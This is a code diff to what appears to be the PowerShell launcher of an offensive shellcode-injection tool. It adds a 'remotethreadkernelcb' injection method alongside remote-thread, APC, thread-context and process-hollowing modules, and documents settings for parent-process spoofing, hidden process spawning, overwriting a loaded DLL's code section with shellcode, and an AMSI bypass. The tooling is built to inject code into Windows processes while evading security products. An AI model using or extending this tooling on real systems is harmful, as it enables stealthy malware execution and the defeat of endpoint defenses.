@@ -12,6 +12,7 @@ Module name. Choose from:
   "remotethreaddll",
   "remotethreadview",
   "remotethreadsuspended",
+  "remotethreadkernelcb",
   "remotethreadapc",
   "remotethreadcontext",
   "processhollow"
@@ -36,16 +37,16 @@ $F = "Passw0rd!"
 # path to the image of a newly spawned process to inject into (used in "remotethreadapc", "remotethreadcontext" and "processhollow")
 $G = "C:\Windows\System32\svchost.exe"
 
-# existing process name to inject into (used in "remotethread", "remotethreaddll", "remotethreadview" and "remotethreadsuspended")
+# existing process name to inject into (used in "remotethread", "remotethreaddll", "remotethreadview", "remotethreadsuspended" and "remotethreadkernelcb")
 $H = "notepad"
 
-# parent process name to spoof the original value (use "0" to disable PPID spoofing)
+# parent process name to spoof the original value (use "0" to disable PPID spoofing) (used in "remotethreadapc", "remotethreadcontext" and "processhollow")
 $I = "explorer"
 
 # loaded module (DLL) name to overwrite its .text section for storing the shellcode (used in "remotethreaddll")
 $J = "msvcp_win.dll"
 
-# block 3rd-party DLLs ("True" / "False")
+# block 3rd-party DLLs ("True" / "False") (used in "remotethreadapc", "remotethreadcontext" and "processhollow")
 $K = "True"
 
 # bypass AMSI ("True" / "False")
@@ -53,7 +54,7 @@ $L = "True"
 
 # --------------------------------------------------------------------
 
-$methods = @("remotethread", "remotethreaddll", "remotethreadview", "remotethreadsuspended")
+$methods = @("remotethread", "remotethreaddll", "remotethreadview", "remotethreadsuspended", "remotethreadkernelcb")
 if ($methods.Contains($A)) {
     $H = (Start-Process -WindowStyle Hidden -PassThru $H).Id
 }
